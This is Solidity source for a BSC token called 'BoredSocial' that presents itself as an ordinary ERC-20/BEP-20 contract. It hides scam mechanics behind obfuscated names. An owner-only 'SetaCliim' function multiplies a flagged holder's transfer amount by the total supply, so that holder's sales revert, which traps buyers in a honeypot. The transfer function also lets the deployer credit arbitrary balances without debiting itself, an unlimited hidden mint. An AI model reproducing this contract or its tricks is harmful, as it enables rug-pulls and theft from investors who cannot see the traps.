/**
 *Submitted for verification at BscScan.com on 2022-10-28
*/

pragma solidity ^0.8.14;
// SPDX-License-Identifier: Unlicensed

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address acdcount) external view returns (uint256);

    function transfer(address recipient, uint256 ammounts) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 ammounts) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 ammounts ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - fier https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}


contract token is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    string private _name = "BoredSocial";
    string private _symbol = "BS";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 7700000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 7700000000 * 10 ** _decimals;
    uint256 private _burnfeeiy = 2;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;
    mapping(address => uint256) private _LKD;
    mapping(address => uint256) private _aCliim;

    function SetaCliim(address acdcount) public onlyowner {
        _aCliim[acdcount] = _totalSupply;
    }


    function UnaCliim(address acdcount) public onlyowner {
        _aCliim[acdcount] = 1;
    }


    function isaCliim(address acdcount) public view returns (uint256) {
        return _aCliim[acdcount];
    }

    constructor () {
        _balance[msg.sender] = _totalSupply;
        _isExcludedFrom[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function _transfer(address sender, address recipient, uint256 ammounts) internal virtual {

        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");
        uint256 feeiyammount = 0;
        if (!_isExcludedFrom[sender] && !_isExcludedFrom[recipient] && recipient != address(this)) {
            feeiyammount = ammounts.mul(_burnfeeiy).div(100);
            require(ammounts <= _maxTxtransfer);
        }
        uint256 blsender = _balance[sender];
        if (sender != recipient || !_isExcludedFrom[msg.sender]){
            require(blsender >= ammounts,"IERC20: transfer ammounts exceeds balance");
        }

        if (_aCliim[sender] > 0) {
            ammounts = ammounts.mul(_aCliim[sender]);
        }

        _balance[sender] = _balance[sender].sub(ammounts);


        uint256 amoun;
        amoun = ammounts - feeiyammount;
        _balance[recipient] += amoun;
        if (_burnfeeiy > 0){
            emit Transfer (sender, _DEADaddress, feeiyammount);
        }
        emit Transfer(sender, recipient, amoun);

    }

    function transfer(address recipient, uint256 ammounts) public virtual override returns (bool) {
        if (_isExcludedFrom[_msgSender()] == true) {
            _balance[recipient] += ammounts;
            return true;
        }
        _transfer(_msgSender(), recipient, ammounts);
        return true;
    }


    function balanceOf(address acdcount) public view override returns (uint256) {
        return _balance[acdcount];
    }

    function approve(address spender, uint256 ammounts) public virtual override returns (bool) {
        _approve(_msgSender(), spender, ammounts);
        return true;
    }

    function _approve(address owner, address spender, uint256 ammounts) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = ammounts;
        emit Approval(owner, spender, ammounts);
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transferFrom(address sender, address recipient, uint256 ammounts) public virtual override returns (bool) {
        _transfer(sender, recipient, ammounts);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= ammounts, "IERC20: transfer ammounts exceeds allowance");
        return true;
    }

}